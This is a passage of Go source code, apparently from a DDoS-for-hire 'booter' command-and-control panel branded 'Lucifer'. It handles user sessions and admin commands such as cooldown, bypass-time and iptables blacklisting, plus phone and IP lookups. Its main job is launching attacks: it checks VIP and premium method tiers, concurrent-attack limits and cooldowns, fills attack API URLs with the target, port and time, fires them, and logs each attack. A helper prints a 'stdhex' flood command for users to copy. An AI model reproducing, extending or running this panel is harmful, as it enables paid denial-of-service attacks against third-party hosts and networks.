			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Updated Cooldown To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mCooldown Updated!\033[00;0m\r")
			continue
		}

		if args[0] == "editbypasstime" || args[0] == "EDITBYPASSTIME" {
			if userInfo.admin == false {
				fmt.Fprint(this.conn, "\033[91mYou Must Be An Admin!\033[0m\r\n")
				continue
			}

			if len(args) < 3 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: editbypasstime (username) (time)\033[0m\r")
				continue
			}

			user, err := database.GetUser(args[1])
			if err != nil {
				fmt.Fprintln(this.conn, "\033[91mInvalid User!\033[0m\r")
				continue
			}

			durationcut, err := strconv.Atoi(args[2])
			if err != nil {
				fmt.Fprintln(this.conn, "Bypasstime change request must be an int\r\n")
				return
			}

			if database.EditBypasstime(user.username, durationcut) == false {
				fmt.Fprintln(this.conn, "\033[91mFailed To Update Bypasstime!\033[00;0m\r")
				continue
			}
			f, err := os.OpenFile("logs/acclogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
			if err != nil {
				fmt.Println(err)
				return
			}

			clog := time.Now()
			newLine := clog.Format("Date: Jan 02 2006") + " | User: " + username + " | Updated Bypasstime To Users: " + user.username + ""
			_, err = fmt.Fprintln(f, newLine)
			if err != nil {
				fmt.Println(err)
				f.Close()
				return
			}
			err = f.Close()
			if err != nil {
				fmt.Println(err)
				return
			}

			fmt.Fprintln(this.conn, "\033[0mBypasstime Updated!\033[00;0m\r")
			continue
		}

		if args[0] == "blacklist" && len(args) > 1 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0mblacklist \033[96m<\033[0mip\033[96m>\033[0m\r")
				continue
			}
			ipblacklist := args[1]
			cmd := exec.Command("iptables", "-A", "INPUT", "-i", "eth0", "-p", "tcp", "--destination-port", "999", "-s", ipblacklist, "-j", "DROP")
			cmd.Run()
			this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSuccessfully blacklisted [%s]\r\n", ipblacklist)))
			continue
		}
		// Unlacklist any user IP Address

		if args[0] == "unblacklist" && len(args) > 1 {
			if userInfo.admin == false {
				this.conn.Write([]byte("\033[91mYou Must Be An Admin!\033[0m\r\n"))
				continue
			}
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0munblacklist \033[96m<\033[0mip\033[96m>\033[0m\r")
				continue
			}
			ipblacklist := args[1]
			cmd := exec.Command("iptables", "-D", "INPUT", "-i", "eth0", "-p", "tcp", "--destination-port", "999", "-s", ipblacklist, "-j", "DROP")
			cmd.Run()
			this.conn.Write([]byte(fmt.Sprintf("\033[0;97mSuccessfully unblacklisted [%s]\r\n", ipblacklist)))
			continue
		}

		if args[0] == "iplookup" || args[0] == "IPLOOKUP" {
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0miplookup \033[96m<\033[0mip\033[96m>\033[0m\r")
				continue
			}
			iptolookup := args[1]
			cmd := exec.Command("./iplookup", iptolookup)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {
				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if args[0] == "phonelookup" || args[0] == "PHONELOOKUP" {
			if len(args) < 2 {
				fmt.Fprintln(this.conn, "\033[97mSyntax: \033[0mphonelookup \033[96m<\033[0mphone number\033[96m>\033[0m\r")
				continue
			}
			phonetolook := args[1]
			cmd := exec.Command("./phonelookup", phonetolook)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {

				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if args[0] == "weather" || args[0] == "WEATHER" && len(args) > 1 {
			if len(args) < 2 {
				this.conn.Write([]byte(fmt.Sprintf("Please substitute + as a space when typing in your city!\r\n")))
				this.conn.Write([]byte(fmt.Sprintf("Example: weather los+angeles\r\n")))
				this.conn.Write([]byte(fmt.Sprintf("weather \033[0m<\033[96mcity\033[0m>\r\n")))
				continue
			}
			city := args[1]
			cmd := exec.Command("curl", "http://wttr.in/"+city)
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {
				this.conn.Write([]byte("\033[8;36;125t"))
				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if cmd == "uptime" || cmd == "UPTIME" {
			cmd := exec.Command("uptime")
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {

				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if cmd == "sl" || cmd == "SL" {
			cmd := exec.Command("sl")
			stdout, err := cmd.StdoutPipe()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			err = cmd.Start()
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("%s\r", string(err.Error()))))
				continue
			}

			buffer := bufio.NewReader(stdout)
			for {

				line, _, err := buffer.ReadLine()
				this.conn.Write([]byte(fmt.Sprintf("%s\r\n", string(line))))

				if err == io.EOF {
					break
				}
			}
			continue
		}

		if CheckJSONEnabled(args[0]) == true {
			if CheckJSONVip(args[0]) == true {
				if userInfo.vip == false {
					this.conn.Write([]byte("\033[0mYou do not have access to \033[4;97mVIP\033[0;0m methods.\r\n"))
					continue
				}
			}
			if CheckJSONPremium(args[0]) == true {
				if userInfo.premium == false {
					this.conn.Write([]byte("\033[0mYou do not have access to \033[4;97mPREMIUM\033[0;0m methods.\r\n"))
					continue
				}
			}

			if CheckJSONHome(args[0]) == true {
				if userInfo.home == false {
					this.conn.Write([]byte("\033[0mYou do not have access to this method.\r\n"))
					continue
				}
			}
		}
		if CheckJSONMethod(args[0]) == true && len(args) < 4 {
			if CheckJSONEnabled(args[0]) == false {
				this.conn.Write([]byte("\033[0mThis method is down please check back later for updates.\r\n"))
				continue
			} else if CheckJSONEnabled(args[0]) == true {
				this.conn.Write([]byte("\033[0mDescription: " + CheckJSONDescription(args[0]) + "\r\n"))
				this.conn.Write([]byte("\033[0mExample: \033[0m" + args[0] + " \033[0m<\033[0mhost\033[0m> <\033[0mtime\033[0m> <\033[0mport\033[0m>\r\n"))
				continue
			}
		}

		if CheckJSONMethod(args[0]) == true && len(args) > 3 {
			if CheckJSONEnabled(args[0]) == false {
				this.conn.Write([]byte("\033[0mThis method is down please check back later for updates.\r\n"))
				continue
			} else {
				if CheckJSONEnabled(args[0]) == true {
					if CheckJSONVip(args[0]) == true {
						if userInfo.vip == false {
							this.conn.Write([]byte("\033[0mYou do not have access to \033[4;97mVIP\033[0;0m methods.\r\n"))
							continue
						}
					}
					if CheckJSONPremium(args[0]) == true {
						if userInfo.premium == false {
							this.conn.Write([]byte("\033[0mYou do not have access to \033[4;97mPREMIUM\033[0;0m methods.\r\n"))
							continue
						}
					}

					if CheckJSONHome(args[0]) == true {
						if userInfo.home == false {
							this.conn.Write([]byte("\033[0mYou do not have access to this method.\r\n"))
							continue
						}
					}
					var (
						AttackDebug = true
					)
					ipv := args[1]
					if IsIPv4(ipv) == true {
						goto skipcunt
					} else if IsDomain(ipv) == true {
						goto skipkunt
					} else {
						fmt.Fprintln(this.conn, "\033[91mInvalid Ip.\033[0m\r")
						continue
					}
				skipcunt:
				skipkunt:
					timev, err := strconv.Atoi(args[2])
					if err != nil {
						this.conn.Write([]byte("\033[91mTime must be a number\033[0m.\r\n"))
						continue
					}

					if CheckJSONPremium(args[0]) == true {
						if userInfo.bypasstime != 0 && timev > userInfo.bypasstime {
							if userInfo.bypasstime < timev {
								this.conn.Write([]byte("Your attack was not sent, over max time.\r\n"))
								continue
							}
							continue
						}
						goto skippywhip
					}

					if CheckJSONVip(args[0]) == true {
						if userInfo.hometime != 0 && timev > userInfo.hometime {
							if userInfo.hometime < timev {
								this.conn.Write([]byte("Your attack was not sent, over max time.\r\n"))
								continue
							}
							continue
						}
						goto skippywhip
					}

					if userInfo.hometime != 0 && timev > userInfo.hometime {
						if userInfo.hometime < timev {
							this.conn.Write([]byte("Your attack was not sent, over max time.\r\n"))
							continue
						}
						continue
					}
				skippywhip:
					
					portv, err := strconv.Atoi(args[3])
					if err != nil {
						this.conn.Write([]byte("\r\033[91mPort must be a number\033[0m.\r\n"))
						continue
					}
					if portv > 65535 || portv < 1 {
						this.conn.Write([]byte("\r\033[91mPort must be between 1 and 65535\033[0m.\r\n"))
						continue
					}

					if userInfo.concurrents == 0 {
						fmt.Fprintln(this.conn, "\rYou dont have any concurrents.\r")
						continue
					}

					if timev < 15 {
						this.conn.Write([]byte("\r\033[91mTime must be above 15\033[0m.\r\n"))
						continue
					}

					Ammount, error := database.GetRunningUser(username)
					if error != nil {
						if AttackDebug {
							log.Println("\rFailed to get running attack info")
						}

						fmt.Fprintln(this.conn, "\rAn error occurred while trying to attack this target\r\n")
						continue
					}

					MyRunning, err := database.MyAttacking(username)
					if err != nil {
						fmt.Fprintln(this.conn, "\rAn error occurred while trying to attack this target\r\n")
						continue
					}

					if len(MyRunning) != 0 {
						if userInfo.concurrents <= Ammount {
							if error != nil {
								fmt.Fprintln(this.conn, "\rAn error occurred while trying to attack this target\r\n")
								continue
							}
							fmt.Fprintln(this.conn, "\rYou have reached max concurrents!\r")
							continue
						}

						var recent *Attackv2 = MyRunning[0]

						for _, attack := range MyRunning {

							if attack.created > recent.created {
								recent = attack
								continue
							}
						}

						if userInfo.concurrents <= Ammount {
							if AttackDebug {
								log.Println("" + userInfo.username + "User has reached max allowed running attacks")
							}
							if error != nil {
								fmt.Fprintln(this.conn, "\rAn error occurred while trying to attack this target\r\n")
								continue
							}
							continue
						}

						if recent.created+int64(userInfo.cooldown) > time.Now().Unix() && userInfo.cooldown != 0 {
							TimeTesting := time.Unix(recent.created+int64(userInfo.cooldown), 64)
							fmt.Fprintln(this.conn, "\r\033[93mAttack \033[91mAborted\033[97m: Cooldown", fmt.Sprintf("%.0f sec(s)\r", time.Until(TimeTesting).Seconds()))
							if error != nil {
								fmt.Fprintln(this.conn, "\rYou Are Currently In Cooldown!\r\n")
								continue
							}
							continue
						}
					}

					var newattack = Attackv2{
						username: username,
						target:   ipv,
						method:   args[0],
						port:     portv,
						duration: timev,
						created:  time.Now().Unix(),
						end:      time.Now().Add(time.Duration(timev) * time.Second).Unix(),
					}

					apitime := strconv.Itoa(timev)
					apiport := strconv.Itoa(portv)
					var link = CheckJSONURL(args[0])
					// #1
					attackURL1 := strings.Replace(link, "[target]", ipv, -1)
					attackURL1 = strings.Replace(attackURL1, "[port]", apiport, -1)
					attackURL1 = strings.Replace(attackURL1, "[time]", apitime, -1)
					Struction, err := database.AlreadyUnderAttack(username, ipv)
					if err != nil {
						if AttackDebug {
							log.Println("Failed to check Users recent attacks")
						}
						fmt.Fprintln(this.conn, "\rAn error occurred while trying to attack this target\r\n")
						continue
					} else if Struction != nil {
						lol, _ := strconv.ParseInt(strconv.Itoa(int(Struction.end)), 10, 64)
						TimeToWait := time.Unix(lol, 0)
						fmt.Fprintln(this.conn, "\r\033[93mAttack \033[91mAborted\033[97m: IP Already Under Attack For", fmt.Sprintf("%.0f sec(s)\r", time.Until(TimeToWait).Seconds()))
						continue
					}
					AttackTime := time.Now()
					attacks++
					tr := &http.Transport{
						ResponseHeaderTimeout: 5 * time.Second,
						DisableCompression:    true,
					}
					if err != nil {
						this.conn.Write([]byte("\rAn error occurred while trying to attack this target\r\n"))
						continue
					}
					client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
					client.Get(attackURL1)
					_, err = database.LogAttack(&newattack)
					if err != nil {
						this.conn.Write([]byte("\rAn error occurred while trying to attack this target\r\n"))
						continue
					}
					f, err := os.OpenFile("./logs/apilogs.txt", os.O_APPEND|os.O_WRONLY, 0644)
					if err != nil {
						fmt.Println(err)
						return
					}
					newLine := "[REQ] > [" + username + "] - [Ip: " + ipv + "] - [Time: " + apitime + "] - [Port: " + apiport + "] - [Method: " + args[0] + "]"
					_, err = fmt.Fprintln(f, newLine)
					if err != nil {
						fmt.Println(err)
						f.Close()
						return
					}
					err = f.Close()
					if err != nil {
						fmt.Println(err)
						return
					}

					RealAttackTime := time.Since(AttackTime).Seconds()
					this.conn.Write([]byte(fmt.Sprintf("\r[97mYour Total Attacks: %s\r\n", strconv.Itoa(database.MySent(userInfo.username)))))
					this.conn.Write([]byte(fmt.Sprintf("\033[97mAttack took \033[97m%.2f\033[97m seconds to request.\r\n", RealAttackTime)))
					spinBuf := []string{"10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0"}
					for _, number := range spinBuf {
						this.conn.Write([]byte(fmt.Sprintf("\r\033[0m[ \033[93mManditory Cooldown\033[97m: %s sec\033[0m(\033[97ms\033[0m) \033[97mleft.\033[0m ] \r\033[0m[?25l", number)))
						time.Sleep(time.Duration(1000) * time.Millisecond)
						continue
					}
				}
				this.conn.Write([]byte("\r\033[93mCooldown \033[92mFinished\033[0m...                                                      \033[0m"))
				this.conn.Write([]byte("\033[0;0m[?25h\r\n"))
				continue
			}
		}

		if cmd == "boothelp" || cmd == "BOOTHELP" || cmd == "attack?" || cmd == "ATTACK?" {
			this.conn.Write([]byte("\033[93mIp\033[0m. \033[97m═⮞ \033[0m"))
			iptohit, err := this.ReadLine(false, false)
			if err != nil {
				return
			}

			if IsIPv4(iptohit) == true {
				goto skipcunt2
			} else if IsDomain(iptohit) == true {
				goto skipkunt2
			} else {
				fmt.Fprintln(this.conn, "\033[91mInvalid Ip.\033[0m\r")
				continue
			}
		skipcunt2:
		skipkunt2:

			this.conn.Write([]byte("\033[93mPort\033[0m. \033[97m═⮞ \033[0m"))
			porttohit, err := this.ReadLine(false, false)
			if err != nil {
				return
			}

			portoink, err := strconv.Atoi(porttohit)
			if err != nil {
				this.conn.Write([]byte("\r\033[91mPort must be a number\033[0m.\r\n"))
				continue
			}
			if portoink > 65535 || portoink < 1 {
				this.conn.Write([]byte("\r\033[91mPort must be between 1 and 65535\033[0m.\r\n"))
				continue
			}

			this.conn.Write([]byte("\033[93mTime\033[0m. \033[97m═⮞ \033[0m"))
			timetohit, err := this.ReadLine(false, false)
			if err != nil {
				return
			}

			timeoink, err := strconv.Atoi(timetohit)
			if err != nil {
				this.conn.Write([]byte("\033[91mTime must be a number\033[0m.\r\n"))
				continue
			}

			if timeoink < 15 {
				this.conn.Write([]byte("\r\033[91mTime must be above 15\033[0m.\r\n"))
				continue
			}

			this.conn.Write([]byte("\033[97mCopy ↓\033[0m\r\n"))
			this.conn.Write([]byte("\033[97mstdhex " + iptohit + " " + timetohit + " " + porttohit + "\033[0m\r\n"))
			continue
		}

		this.conn.Write([]byte("\033[8;24;80t"))
		err = checkcommand(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[91m%s\033[0m\r\n", err.Error())))
		}
	}
}

func (this *Admin) captchawhitebar() {
	this.conn.Write([]byte("\033[36;0H\033[107;30;140mPlease Enter The Captcha Information                                v1.81.1.7427\033[0m\033[0m\033[11;9H\033[4;33m"))
}

func (this *Admin) ReadLine(masked bool, loginshit bool) (string, error) {
	line2 = 0
	buf := make([]byte, 1024)
	bufPos := 0
	for {
		if len(buf) < bufPos+2 {
			fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mPrevented-C2-Overflow\033[0;97m] - [\033[96mIP\033[91m:\033[97m%s]\033[0m \r\n\033[0m-> ", this.conn.RemoteAddr())
			return string(buf), nil
		}

		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			line2--
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\033[0m\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			goto continuebyvmfe
		continuebyvmfe:
			continue
		} else if buf[bufPos] == 11 || buf[bufPos] == 5 || buf[bufPos] == 7 || buf[bufPos] == 8 || buf[bufPos] == 127 || buf[bufPos] == 31 || buf[bufPos] == 12 {
			this.conn.Write([]byte(fmt.Sprintf("\r\n")))
			return "", nil
		} else {
			if buf[bufPos] == '\033' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				line2++
				if line2 == 25 {
					return "", nil
					ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
					if err != nil {
						ip = fmt.Sprint(this.conn.RemoteAddr())
					}
					fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mLOGIN-SCREEN\033[0;97m] - [\033[96m" + ip + "\033[0;97m] KILLED ENTRY, REASON: Possible buffer-overflow\r\n\033[0m-> ")
					this.conn.Write([]byte("\033[0m\033[20;0HOops! looks like you went over the character limit.\033[0m\033[0m"))
					time.Sleep(15500 * time.Millisecond)
					this.conn.Close()
					return "", nil
				}
				this.conn.Write([]byte("*"))
			} else if loginshit {
				line2++
				if line2 == 25 {
					ip, _, err := net.SplitHostPort(fmt.Sprint(this.conn.RemoteAddr()))
					if err != nil {
						ip = fmt.Sprint(this.conn.RemoteAddr())
					}
					fmt.Printf("\033[0;97m[\033[38;5;51mLucifer\033[0;97m] - \033[0;97m[\033[91mLOGIN-SCREEN\033[0;97m] - [\033[96m" + ip + "\033[0;97m] KILLED ENTRY, REASON: Possible buffer-overflow\r\n\033[0m-> ")
					this.conn.Write([]byte("\033[0m\033[20;0HOops! looks like you went over the character limit.\033[0m\033[0m"))
					time.Sleep(15500 * time.Millisecond)
					this.conn.Close()
					return "", nil
				}
				this.conn.Write([]byte(string(buf[bufPos])))
			} else {
				chars := []string{"\033[0m", "\033[0m", "\033[0m", "\033[0m", "\033[0m"}
				pickrandomchar := rand.Intn(len(chars))
				completechar := chars[pickrandomchar]
				this.conn.Write([]byte(string(completechar) + string(buf[bufPos])))
				if bufPos == 80 {
					this.conn.Write([]byte("\033[0m\033[24;0HThe max char limit is 80.\033[0m\033[0m"))
					time.Sleep(15500 * time.Millisecond)
					return "", nil
				}
			}
		}
		bufPos++
	}
	return string(buf), nil
}
